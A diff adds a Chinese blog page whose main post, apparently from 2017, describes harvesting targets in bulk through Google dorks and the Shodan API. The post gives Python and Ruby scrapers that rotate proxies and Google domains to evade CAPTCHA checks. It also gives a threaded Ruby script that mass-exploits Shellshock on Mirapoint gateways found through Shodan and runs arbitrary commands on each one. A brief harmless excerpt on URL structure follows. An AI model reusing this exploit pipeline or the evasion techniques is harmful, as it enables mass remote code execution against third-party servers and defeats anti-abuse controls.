@@ -64,6 +64,206 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-利用大数据进行攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/01/15/利用大数据进行攻击/" class="article-date">
+  <time datetime="2017-01-15T11:14:09.000Z" itemprop="datePublished">2017-01-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/01/15/利用大数据进行攻击/">利用大数据进行攻击</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>我们在日常的威胁响应中，常常需要定义当前漏洞的危害程度，通常我们是通过某漏洞应用的使用量来判定。但是使用量怎么判断也没有一个准确的说法，一般来说我们通过构造语法去搜索引擎搜索该应用的搜索结果数，并以此为根据来判断一个漏洞是否严重。</p>
+<p>不仅如此，试想，假如我们手握一个0day或者刚公开的1day漏洞的exp时，如何最大化这个漏洞的价值呢？</p>
+<p>这个时候我们就需要利用该漏洞去批量检测或利用，批量的数据一般来自搜索引擎（Google、Bing、Baidu）、开放的网络信息搜索引擎（FOFA、ZoomEye、Shodan）等。</p>
+<p>下面将就这几个方法一个个分析数据获取和利用方式。</p>
+<h3 id="0x01-利用Google"><a href="#0x01-利用Google" class="headerlink" title="0x01 利用Google"></a>0x01 利用Google</h3><p>如果我们能够掌握一个应用的具体搜索语法，则可以利用该语法去搜索引擎中批量检索匹配的应用，再从中提取出URL，放入扫描器里批量扫描，检测是否存在漏洞：</p>
+<p><img src="/upload_image/Dashuju-1.jpg" alt=""></p>
+<p>但是搜索引擎也有其缺点，当我们的扫描器批量检索时，可能会触发恶意搜索检查。比如Google会对同一IP的批量搜索报警，报警后必须通过验证码验证才能继续搜索：</p>
+<p><img src="/upload_image/Dashuju-2.jpg" alt=""></p>
+<p>因此想要批量利用搜索引擎，只有先想办法逃避搜索引擎的恶意搜索检查。在Google里，我能想到的绕过方法有两个：</p>
+<ol>
+<li>利用代理出口，通过更换IP的方式逃避Google的源IP检查</li>
+<li>利用Google众多子域名（.hk .jp .co）分布搜索</li>
+</ol>
+<p>将这两种绕过方式结合之后，我们就可以尝试搜索大一点的数据量了，python实现代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding=gbk</span></div><div class="line"><span class="keyword">from</span> google <span class="keyword">import</span> search</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"></div><div class="line">proxy = urllib2.ProxyHandler(&#123;<span class="string">'http'</span>: <span class="string">'127.0.0.1:8087'</span>&#125;)</div><div class="line">opener = urllib2.build_opener(proxy)</div><div class="line">urllib2.install_opener(opener)</div><div class="line"></div><div class="line">target_lists = []</div><div class="line">google_sites = [<span class="string">'is'</span>, <span class="string">'dk'</span>, <span class="string">'no'</span>, <span class="string">'se'</span>, <span class="string">'fi'</span>, <span class="string">'ee'</span>, <span class="string">'lv'</span>, <span class="string">'lt'</span>, <span class="string">'ie'</span>, <span class="string">'co.uk'</span>, <span class="string">'gg'</span>, <span class="string">'je'</span>, <span class="string">'im'</span>, <span class="string">'fr'</span>, <span class="string">'nl'</span>, <span class="string">'be'</span>, <span class="string">'lu'</span>, <span class="string">'de'</span>, <span class="string">'at'</span>, <span class="string">'ch'</span>, <span class="string">'li  '</span>, <span class="string">'pt'</span>, <span class="string">'es'</span>, <span class="string">'com.gi'</span>, <span class="string">'ad'</span>, <span class="string">'it'</span>, <span class="string">'com.mt'</span>, <span class="string">'sm'</span>, <span class="string">'gr'</span>, <span class="string">'ru'</span>, <span class="string">'com.by'</span>, <span class="string">'com.ua'</span>, <span class="string">'pl'</span>, <span class="string">'cz'</span>, <span class="string">'sk'</span>, <span class="string">'hu'</span>, <span class="string">'si'</span>, <span class="string">'hr'</span>, <span class="string">'ba'</span>, <span class="string">'me'</span>, <span class="string">'rs'</span>, <span class="string">'mk'</span>, <span class="string">'bg'</span>, <span class="string">'ro'</span>, <span class="string">'md'</span>, <span class="string">'com.hk'</span>, <span class="string">'mn'</span>, <span class="string">'co.kr'</span>, <span class="string">'co.jp'</span>, <span class="string">'com.vn'</span>, <span class="string">'la'</span>, <span class="string">'com.kh'</span>, <span class="string">'co.th'</span>, <span class="string">'com.my'</span>, <span class="string">'com.sg'</span>, <span class="string">'com.bn'</span>, <span class="string">'com.ph'</span>, <span class="string">'co.id'</span>, <span class="string">'tp'</span>, <span class="string">'kz'</span>, <span class="string">'kg'</span>, <span class="string">'com.tj'</span>, <span class="string">'co.uz'</span>, <span class="string">'tm'</span>, <span class="string">'com.af'</span>, <span class="string">'com.pk'</span>, <span class="string">'com.np'</span>, <span class="string">'co.in'</span>, <span class="string">'com.bd'</span>, <span class="string">'lk'</span>, <span class="string">'mv'</span>, <span class="string">'com.kw'</span>, <span class="string">'com.sa'</span>, <span class="string">'com.bh'</span>, <span class="string">'ae'</span>, <span class="string">'com.om'</span>, <span class="string">'jo'</span>, <span class="string">'co.il'</span>, <span class="string">'com.lb'</span>, <span class="string">'com.tr'</span>, <span class="string">'az'</span>, <span class="string">'am'</span>, <span class="string">'co.ls'</span>, <span class="string">'com.eg'</span>, <span class="string">'com.ly'</span>, <span class="string">'dz'</span>, <span class="string">'co.ma'</span>, <span class="string">'sn'</span>, <span class="string">'gm'</span>, <span class="string">'ml'</span>, <span class="string">'bf'</span>, <span class="string">'com.sl'</span>, <span class="string">'ci'</span>, <span class="string">'com.gh'</span>, <span class="string">'tg'</span>, <span class="string">'bj'</span>, <span class="string">'ne'</span>, <span class="string">'com.ng'</span>, <span class="string">'sh'</span>, <span class="string">'cm'</span>, <span class="string">'td'</span>, <span class="string">'cf'</span>, <span class="string">'ga'</span>, <span class="string">'cg'</span>, <span class="string">'cd'</span>, <span class="string">'it.ao'</span>, <span class="string">'com.et'</span>, <span class="string">'dj'</span>, <span class="string">'co.ke'</span>, <span class="string">'co.ug'</span>, <span class="string">'co.tz'</span>, <span class="string">'rw'</span>, <span class="string">'bi'</span>, <span class="string">'mw'</span>, <span class="string">'co.mz'</span>, <span class="string">'mg'</span>, <span class="string">'sc'</span>, <span class="string">'mu'</span>, <span class="string">'co.zm'</span>, <span class="string">'co.zw'</span>, <span class="string">'co.bw'</span>, <span class="string">'com.na'</span>, <span class="string">'co.za'</span>, <span class="string">'com.au'</span>, <span class="string">'com.nf'</span>, <span class="string">'co.nz'</span>, <span class="string">'com.sb'</span>, <span class="string">'com.fj'</span>, <span class="string">'fm'</span>, <span class="string">'ki'</span>, <span class="string">'nr'</span>, <span class="string">'tk'</span>, <span class="string">'ws'</span>, <span class="string">'as'</span>, <span class="string">'to'</span>, <span class="string">'nu'</span>, <span class="string">'co.ck'</span>, <span class="string">'com.do'</span>, <span class="string">'tt'</span>, <span class="string">'com.co'</span>, <span class="string">'com.ec'</span>, <span class="string">'co.ve'</span>, <span class="string">'gy'</span>, <span class="string">'com.pe'</span>, <span class="string">'com.bo'</span>, <span class="string">'com.py'</span>, <span class="string">'com.br'</span>, <span class="string">'com.uy'</span>, <span class="string">'com.ar'</span>, <span class="string">'cl'</span>, <span class="string">'gl'</span>, <span class="string">'ca'</span>, <span class="string">'com'</span>, <span class="string">'com.mx'</span>, <span class="string">'com.gt'</span>, <span class="string">'com.bz'</span>, <span class="string">'com.sv'</span>, <span class="string">'hn'</span>, <span class="string">'com.ni'</span>, <span class="string">'co.cr'</span>, <span class="string">'com.pa'</span>, <span class="string">'bs'</span>, <span class="string">'com.cu'</span>, <span class="string">'com.jm'</span>, <span class="string">'ht'</span>]</div><div class="line"></div><div class="line">targets = open(<span class="string">'lists'</span>, <span class="string">'r'</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> targets:</div><div class="line">        query = <span class="string">'intitle:皇冠国际 AND site:%s'</span> % line</div><div class="line"></div><div class="line">        site = google_sites[random.randint(<span class="number">0</span>, len(google_sites) - <span class="number">1</span>)]</div><div class="line"></div><div class="line">        <span class="keyword">print</span> <span class="string">"[*] Using google.%s and checking %s"</span> % (site, line)</div><div class="line"></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">for</span> url <span class="keyword">in</span> search(query, site, stop = <span class="number">1</span>):</div><div class="line">                        <span class="keyword">print</span> <span class="string">"[+] hacked: %s"</span> % url</div><div class="line"></div><div class="line">        <span class="keyword">except</span>:</div><div class="line">                <span class="keyword">pass</span></div></pre></td></tr></table></figure>
+<p>ruby：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Google</span></span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(query, proxy = <span class="literal">nil</span>)</span></span></div><div class="line">        @query = query</div><div class="line">        @proxy = proxy</div><div class="line">        @sites = [<span class="string">'is'</span>, <span class="string">'dk'</span>, <span class="string">'no'</span>, <span class="string">'se'</span>, <span class="string">'fi'</span>, <span class="string">'ee'</span>, <span class="string">'lv'</span>, <span class="string">'lt'</span>, <span class="string">'ie'</span>, <span class="string">'co.uk'</span>, <span class="string">'gg'</span>, <span class="string">'je'</span>, <span class="string">'im'</span>, <span class="string">'fr'</span>, <span class="string">'nl'</span>, <span class="string">'be'</span>, <span class="string">'lu'</span>, <span class="string">'de'</span>, <span class="string">'at'</span>, <span class="string">'ch'</span>, <span class="string">'li  '</span>, <span class="string">'pt'</span>, <span class="string">'es'</span>, <span class="string">'com.gi'</span>, <span class="string">'ad'</span>, <span class="string">'it'</span>, <span class="string">'com.mt'</span>, <span class="string">'sm'</span>, <span class="string">'gr'</span>, <span class="string">'ru'</span>, <span class="string">'com.by'</span>, <span class="string">'com.ua'</span>, <span class="string">'pl'</span>, <span class="string">'cz'</span>, <span class="string">'sk'</span>, <span class="string">'hu'</span>, <span class="string">'si'</span>, <span class="string">'hr'</span>, <span class="string">'ba'</span>, <span class="string">'me'</span>, <span class="string">'rs'</span>, <span class="string">'mk'</span>, <span class="string">'bg'</span>, <span class="string">'ro'</span>, <span class="string">'md'</span>, <span class="string">'com.hk'</span>, <span class="string">'mn'</span>, <span class="string">'co.kr'</span>, <span class="string">'co.jp'</span>, <span class="string">'com.vn'</span>, <span class="string">'la'</span>, <span class="string">'com.kh'</span>, <span class="string">'co.th'</span>, <span class="string">'com.my'</span>, <span class="string">'com.sg'</span>, <span class="string">'com.bn'</span>, <span class="string">'com.ph'</span>, <span class="string">'co.id'</span>, <span class="string">'tp'</span>, <span class="string">'kz'</span>, <span class="string">'kg'</span>, <span class="string">'com.tj'</span>, <span class="string">'co.uz'</span>, <span class="string">'tm'</span>, <span class="string">'com.af'</span>, <span class="string">'com.pk'</span>, <span class="string">'com.np'</span>, <span class="string">'co.in'</span>, <span class="string">'com.bd'</span>, <span class="string">'lk'</span>, <span class="string">'mv'</span>, <span class="string">'com.kw'</span>, <span class="string">'com.sa'</span>, <span class="string">'com.bh'</span>, <span class="string">'ae'</span>, <span class="string">'com.om'</span>, <span class="string">'jo'</span>, <span class="string">'co.il'</span>, <span class="string">'com.lb'</span>, <span class="string">'com.tr'</span>, <span class="string">'az'</span>, <span class="string">'am'</span>, <span class="string">'co.ls'</span>, <span class="string">'com.eg'</span>, <span class="string">'com.ly'</span>, <span class="string">'dz'</span>, <span class="string">'co.ma'</span>, <span class="string">'sn'</span>, <span class="string">'gm'</span>, <span class="string">'ml'</span>, <span class="string">'bf'</span>, <span class="string">'com.sl'</span>, <span class="string">'ci'</span>, <span class="string">'com.gh'</span>, <span class="string">'tg'</span>, <span class="string">'bj'</span>, <span class="string">'ne'</span>, <span class="string">'com.ng'</span>, <span class="string">'sh'</span>, <span class="string">'cm'</span>, <span class="string">'td'</span>, <span class="string">'cf'</span>, <span class="string">'ga'</span>, <span class="string">'cg'</span>, <span class="string">'cd'</span>, <span class="string">'it.ao'</span>, <span class="string">'com.et'</span>, <span class="string">'dj'</span>, <span class="string">'co.ke'</span>, <span class="string">'co.ug'</span>, <span class="string">'co.tz'</span>, <span class="string">'rw'</span>, <span class="string">'bi'</span>, <span class="string">'mw'</span>, <span class="string">'co.mz'</span>, <span class="string">'mg'</span>, <span class="string">'sc'</span>, <span class="string">'mu'</span>, <span class="string">'co.zm'</span>, <span class="string">'co.zw'</span>, <span class="string">'co.bw'</span>, <span class="string">'com.na'</span>, <span class="string">'co.za'</span>, <span class="string">'com.au'</span>, <span class="string">'com.nf'</span>, <span class="string">'co.nz'</span>, <span class="string">'com.sb'</span>, <span class="string">'com.fj'</span>, <span class="string">'fm'</span>, <span class="string">'ki'</span>, <span class="string">'nr'</span>, <span class="string">'tk'</span>, <span class="string">'ws'</span>, <span class="string">'as'</span>, <span class="string">'to'</span>, <span class="string">'nu'</span>, <span class="string">'co.ck'</span>, <span class="string">'com.do'</span>, <span class="string">'tt'</span>, <span class="string">'com.co'</span>, <span class="string">'com.ec'</span>, <span class="string">'co.ve'</span>, <span class="string">'gy'</span>, <span class="string">'com.pe'</span>, <span class="string">'com.bo'</span>, <span class="string">'com.py'</span>, <span class="string">'com.br'</span>, <span class="string">'com.uy'</span>, <span class="string">'com.ar'</span>, <span class="string">'cl'</span>, <span class="string">'gl'</span>, <span class="string">'ca'</span>, <span class="string">'com'</span>, <span class="string">'com.mx'</span>, <span class="string">'com.gt'</span>, <span class="string">'com.bz'</span>, <span class="string">'com.sv'</span>, <span class="string">'hn'</span>, <span class="string">'com.ni'</span>, <span class="string">'co.cr'</span>, <span class="string">'com.pa'</span>, <span class="string">'bs'</span>, <span class="string">'com.cu'</span>, <span class="string">'com.jm'</span>, <span class="string">'ht'</span>]</div><div class="line"></div><div class="line">        @result = []</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(stop = <span class="number">50</span>)</span></span></div><div class="line">        site = <span class="string">"www.google.<span class="subst">#&#123;@sites[rand(@sites.size)]&#125;</span>"</span></div><div class="line">        page_count = <span class="number">50</span> <span class="comment"># per page result counts</span></div><div class="line">        start_index = <span class="number">0</span> <span class="comment"># page count</span></div><div class="line"></div><div class="line">        url = site + <span class="string">"/search?num="</span> + page_count.to_s + <span class="string">"&amp;q="</span> + CGI::escape(@query)</div><div class="line"></div><div class="line">        result_count = <span class="number">0</span></div><div class="line"></div><div class="line">        <span class="keyword">begin</span></div><div class="line">            <span class="keyword">if</span> @proxy.<span class="literal">nil</span>?</div><div class="line">                response = Typhoeus.get(url, <span class="symbol">followlocation:</span> <span class="literal">true</span>, <span class="symbol">cache_ttl:</span> <span class="number">500</span>)</div><div class="line">            <span class="keyword">else</span></div><div class="line">                response = Typhoeus.get(</div><div class="line">                    url,</div><div class="line">                    <span class="symbol">proxy:</span> @proxy,</div><div class="line">                    <span class="symbol">proxytype:</span> <span class="string">"socks5"</span>,</div><div class="line">          <span class="symbol">followlocation:</span> <span class="literal">true</span>,</div><div class="line">          <span class="symbol">cache_ttl:</span> <span class="number">500</span></div><div class="line">                )</div><div class="line">            <span class="keyword">end</span></div><div class="line"></div><div class="line">            @result += parse_result(response.body)</div><div class="line"></div><div class="line">            result_count += page_count</div><div class="line"></div><div class="line">            site = <span class="string">"www.google.<span class="subst">#&#123;@sites[rand(@sites.size)]&#125;</span>"</span></div><div class="line">            page_count = <span class="number">50</span> <span class="comment"># per page result counts</span></div><div class="line">            start_index += result_count <span class="comment"># page count</span></div><div class="line"></div><div class="line">            url = site + <span class="string">"/search?num="</span> + page_count.to_s + <span class="string">"&amp;q="</span> + CGI::escape(@query)</div><div class="line">        <span class="keyword">end</span> <span class="keyword">while</span> result_count &lt; stop.to_i</div><div class="line"></div><div class="line">        @result.uniq!</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    private</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_result</span><span class="params">(body)</span></span></div><div class="line">        html_doc = Nokogiri::HTML(body)</div><div class="line">        urls = []</div><div class="line"></div><div class="line">        html_doc.css(<span class="string">"li[class='g'] h3[class='r'] a"</span>).each <span class="keyword">do</span> <span class="params">|url|</span></div><div class="line">            urls &lt;&lt; url[<span class="string">'href'</span>].match(<span class="regexp">/(https?:\/\/[^\/]*)\//</span>)[<span class="number">1</span>]</div><div class="line">        <span class="keyword">end</span></div><div class="line"></div><div class="line">        urls</div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">puts <span class="string">'[*] Searching Google ...'</span></div><div class="line"></div><div class="line">google = Google.new(<span class="string">'inurl:/cgi-bin/madmin.cgi'</span>, <span class="string">'127.0.0.1:8081'</span>))</div><div class="line">result = google.search(<span class="number">50</span>)</div></pre></td></tr></table></figure>
+<p>这样我们就能够批量从google中获取搜索结果了</p>
+<hr>
+<h2 id="0x02-利用Shodan"><a href="#0x02-利用Shodan" class="headerlink" title="0x02 利用Shodan"></a>0x02 利用Shodan</h2><p><a href="https://www.shodan.io/" target="_blank" rel="external">Shodan</a>（撒旦）可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。每个月Shodan都会在大约5亿个服务器上日夜不停地搜集信息。</p>
+<p><img src="/upload_image/Dashuju-3.jpg" alt=""></p>
+<p>与谷歌不同的是，Shodan不是在网上搜索网址，而是直接进入互联网的背后通道。</p>
+<p>Shodan所搜集到的信息是极其惊人的。凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到。</p>
+<p>Shodan的使用者曾发现过一个水上公园的控制系统，一个加油站，甚至一个酒店的葡萄酒冷却器。而网站的研究者也曾使用Shodan定位到了核电站的指挥和控制系统及一个粒子回旋加速器。</p>
+<p>Shodan真正值得注意的能力就是能找到几乎所有和互联网相关联的东西。而Shodan真正的可怕之处就是这些设备几乎都没有安装安全防御措施，其可以随意进入。</p>
+<p>Shodan的开发者给我们带来大量数据的同时，也提供了友好的接口供我们查询，比如Ruby就有一个gem包名为Shodan，通过这个包，我们可以方便的查询Shodan的数据。</p>
+<p>具体的开发文档可以看<a href="https://developer.shodan.io/" target="_blank" rel="external">这里</a></p>
+<p>这里说一下API，默认用户的API KEY只能有100次查询限制，每次查询最多只能获得100个结果，除非去购买付费计划：</p>
+<p><img src="/upload_image/Dashuju-4.jpg" alt=""></p>
+<p>下面我们同样以mirapoint邮件网关来搜索下：</p>
+<p><img src="/upload_image/Dashuju-5.jpg" alt=""></p>
+<p>Shodan按国家和地区将搜索结果进行分类。</p>
+<p>我们调用接口来试试：</p>
+<p>它的使用方法很简单，首先创建一个<strong>Shodan::Shodan</strong>的实例对象：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">api = Shodan::Shodan.new(api_key)</div></pre></td></tr></table></figure>
+<p>然后再调用对象的<strong>search</strong>方法进行搜索就可以了：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">result = api.search(qury)</div></pre></td></tr></table></figure>
+<p>实际测试（使用mirapoint邮件网关的bash漏洞）：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">'net/http'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'json'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'base64'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'cgi'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'typhoeus'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'shodan'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_targets_from_shodan</span><span class="params">(query=<span class="string">''</span>, key=<span class="string">'XXXXXXXXXXXXXXXXXXX'</span>)</span></span></div><div class="line">  result = []</div><div class="line">  api = Shodan::Shodan.new key</div><div class="line">  search_result = api.search(query)</div><div class="line">  search_result[<span class="string">'matches'</span>].each <span class="keyword">do</span> <span class="params">|host|</span></div><div class="line">    result &lt;&lt; host[<span class="string">'ip_str'</span>]</div><div class="line">  <span class="keyword">end</span></div><div class="line"></div><div class="line">  result</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack_target</span><span class="params">(<span class="symbol">target:</span> <span class="literal">nil</span>, <span class="symbol">cmd:</span> <span class="string">'/usr/bin/id'</span>)</span></span></div><div class="line">  target &lt;&lt; <span class="string">'/cgi-bin/madmin.cgi'</span></div><div class="line">  exp = <span class="string">'() &#123; :; &#125;; echo `echo X-Bash: test`;'</span></div><div class="line">  response = Typhoeus.get(target, <span class="symbol">headers:</span> &#123;<span class="string">'test'</span> =&gt; exp&#125;)</div><div class="line"></div><div class="line">  <span class="keyword">if</span> response.headers.has_key? <span class="string">'X-Bash'</span></div><div class="line">    response = Typhoeus.get(target, <span class="symbol">headers:</span> &#123;<span class="string">'test'</span> =&gt; <span class="string">"() &#123; :; &#125;; echo; echo just4fun; echo `<span class="subst">#&#123;cmd&#125;</span>`; echo nuf4tsuj;"</span>&#125;)</div><div class="line">    result = response.body.scan(<span class="regexp">/just4fun\n(.*)\nnuf4tsuj/m</span>)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> result.is_a? Array</div><div class="line">      result[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span></div><div class="line">      <span class="literal">false</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">else</span></div><div class="line">    <span class="literal">false</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"></div><div class="line">query = <span class="string">'mirapoint'</span></div><div class="line">targets = get_targets_from_shodan(query)</div><div class="line"></div><div class="line">puts <span class="string">"[*] Result total: <span class="subst">#&#123;targets.size&#125;</span>"</span></div><div class="line"></div><div class="line">threads = []</div><div class="line">targets.each <span class="keyword">do</span> <span class="params">|target|</span></div><div class="line">  threads &lt;&lt; Thread.new &#123;</div><div class="line">    result = attack_target(<span class="symbol">target:</span> target)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> result</div><div class="line">      puts <span class="string">"[+] <span class="subst">#&#123;target&#125;</span>"</span></div><div class="line">      puts <span class="string">"[*] <span class="subst">#&#123;result[<span class="number">0</span>]&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  &#125;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">threads.each &#123;<span class="params">|thr|</span> thr.join&#125;</div></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="/upload_image/Dashuju-6.jpg" alt=""></p>
+<hr>
+<h2 id="0x04-总结-amp-amp-展望"><a href="#0x04-总结-amp-amp-展望" class="headerlink" title="0x04 总结 &amp;&amp; 展望"></a>0x04 总结 &amp;&amp; 展望</h2><p>这些利用大数据进行攻击的目的其实有两个：</p>
+<ol>
+<li>检测漏洞修复率</li>
+<li>批量利用漏洞进行攻击</li>
+</ol>
+<p>目前来说，上面这两种方法都不能够获取到万级以上的数据，毕竟数据都是要钱来买的，所以我们才要自己建立一个指纹识别引擎，不管是检测漏洞也好还是利用漏洞也好，没有数据的话什么都不能开展。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2017/01/15/利用大数据进行攻击/" data-id="cjbomvixe000it01b6165yuvz" class="article-share-link">Partager</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-HTTP-协议" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/12/23/HTTP-协议/" class="article-date">
+  <time datetime="2016-12-23T05:15:58.000Z" itemprop="datePublished">2016-12-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/23/HTTP-协议/">HTTP 协议</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="https://www.jianshu.com/p/80e25cb1d81a" target="_blank" rel="external">转</a></p>
+<h4 id="详解URL的组成"><a href="#详解URL的组成" class="headerlink" title="详解URL的组成"></a>详解URL的组成</h4><p>就以下面这个URL为例，介绍下普通URL的各部分组成</p>
+<p><a href="http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name" target="_blank" rel="external">http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name</a><br>从上面的URL可以看出，一个完整的URL包括以下几部分：<br><strong>1.</strong>协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符</p>
+<p><strong>2.</strong>域名部分：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用</p>
+<p><strong>3.</strong>端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口</p>
+<p><strong>4.</strong>虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”</p>
+<p><strong>5.</strong>文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</p>
+<p><strong>6.</strong>锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</p>
+<p><strong>7.</strong>参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p>
+<h4 id="URI和URL的区别"><a href="#URI和URL的区别" class="headerlink" title="URI和URL的区别"></a>URI和URL的区别</h4><p>URI ，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。<br>Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的<br>URI一般由三部组成：<br>①访问资源的命名机制<br>②存放资源的主机名<br>③资源自身的名称，由路径表示，着重强调于资源。</p>
